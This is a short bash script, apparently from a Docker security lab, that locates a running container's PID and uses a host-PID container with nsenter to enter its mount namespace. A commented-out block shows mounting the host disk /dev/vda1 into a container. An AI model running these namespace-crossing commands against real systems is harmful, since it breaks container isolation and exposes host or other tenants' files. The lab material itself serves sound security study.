#!/bin/bash

attack="home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/privileged_attacker/minitest"
#echo "Please give container's id:"
#read container_id
docker ps | grep debian > dockerps
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
rm PID
: <<'END'
nsenter --target ${container_pid} --mount mknod --mode 0600 ${dev} b ${major} ${minor}
nsenter --target ${container_pid} --mount mkdir -p /tmpmount
nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
END

#Done by attacker no2
#Attack container
#: <<'END'
docker run --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount ls

sudo rm dockerps
sudo rm containerid
